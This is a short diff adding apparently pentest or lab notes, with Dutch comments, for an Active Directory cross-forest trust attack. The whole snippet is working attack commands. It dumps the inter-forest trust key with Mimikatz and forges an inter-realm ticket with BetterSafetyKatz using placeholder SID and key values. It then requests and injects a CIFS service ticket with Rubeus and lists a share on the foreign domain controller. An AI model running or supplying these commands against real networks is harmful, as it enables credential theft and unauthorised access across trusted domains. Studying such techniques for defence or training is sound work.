@@ -1,0 +1,8 @@
+# Cross-Forest trust aanval
+# Stap 1: Inter-forest trust key ophalen
+Invoke-Mimikatz -Command '"lsadump::trust /patch"'
+# Stap 2: Inter-forest TGT forgery
+C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:current.local /sid:S-1-5-21-CURRENT-SID /rc4:TRUST_KEY /service:krbtgt /target:external.local /ticket:C:\Windows\tasks\trust_forest_tkt.kirbi" "exit"
+# Stap 3: TGS aanvragen + injecteren
+.\Rubeus.exe asktgs /ticket:C:\Windows\tasks\trust_forest_tkt.kirbi /service:cifs/ext-dc.external.local /dc:ext-dc.external.local /ptt
+ls \\ext-dc.external.local\SharedFolder\
